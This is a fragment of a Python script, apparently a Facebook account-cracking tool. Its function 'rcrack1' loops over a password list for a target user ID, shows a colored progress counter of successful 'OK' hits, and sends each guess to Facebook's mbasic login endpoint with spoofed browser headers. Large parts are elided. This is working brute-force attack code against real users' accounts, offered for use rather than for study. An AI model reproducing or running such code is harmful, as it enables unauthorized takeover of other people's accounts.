...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;36m=[%sRAJU\033[1;36m]=\033[1;34m∆\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m∆\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
...
            'scheme':'https',
            ...
            'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?next=https://developers.facebook.com/tools/debug/&amp;refsrc=deprecated&amp;lwv=100',data=log_data,headers=header_freefb).text
